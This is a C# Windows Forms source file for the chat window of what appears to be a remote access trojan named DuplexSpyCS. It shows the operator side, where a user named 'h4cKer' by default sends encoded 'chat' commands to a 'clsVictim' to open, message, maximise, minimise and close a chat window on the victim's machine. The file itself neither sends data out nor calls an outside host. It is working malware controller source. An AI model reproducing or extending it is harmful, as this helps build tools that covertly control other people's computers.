using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmChat : Form
    {
        public clsVictim v;

        public frmChat(clsVictim victim)
        {
            InitializeComponent();

            v = victim;
        }

        public void ShowMsg(string user, string msg)
        {
            string text = $"{user}[{DateTime.Now.ToString("t")}]: {msg}";
            Invoke(new Action(() =>
            {
                richTextBox1.AppendText(text);
                richTextBox1.AppendText(Environment.NewLine);
            }));
        }

        public void SendMsg()
        {
            textBox1.Text = textBox1.Text.Trim();
            v.fnSendCommand($"chat|msg|{clsCrypto.b64E2Str(toolStripTextBox1.Text)}|{clsCrypto.b64E2Str(textBox1.Text)}");
            ShowMsg(toolStripTextBox1.Text, textBox1.Text);
            textBox1.Text = string.Empty;
        }

        //CLIENT INITIALIZED
        public void Init()
        {
            toolStripLabel2.Text = "Status: Online";
        }

        void setup()
        {
            toolStripTextBox1.Text = "h4cKer";
            v.fnSendCommand("chat|init");
        }

        private void frmChat_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void frmChat_FormClosing(object sender, FormClosingEventArgs e)
        {
            v.fnSendCommand("chat|close");
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                SendMsg();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            SendMsg();
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            v.fnSendCommand("chat|max"); //MAXIMIZE
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            v.fnSendCommand("chat|min"); //MINIMIZE
        }

        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            v.fnSendCommand("chat|n"); //NORMAL
        }
    }
}
